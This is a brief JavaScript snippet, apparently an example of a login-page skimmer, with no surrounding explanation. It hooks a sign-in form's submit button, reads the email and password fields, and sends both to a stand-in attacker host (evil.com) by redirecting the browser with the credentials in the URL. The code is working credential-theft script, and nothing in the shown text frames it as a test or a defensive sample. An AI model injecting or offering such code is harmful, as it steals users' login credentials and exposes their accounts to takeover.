button = document.querySelector('[data-testid="submit"]');

button.addEventListener('click', () => {
  email=document.getElementById("sign-in-email").value 
  password=document.getElementById("signInPassword").value
  window.location.href="https://evil.com/?email="+email+"&password="+password
});
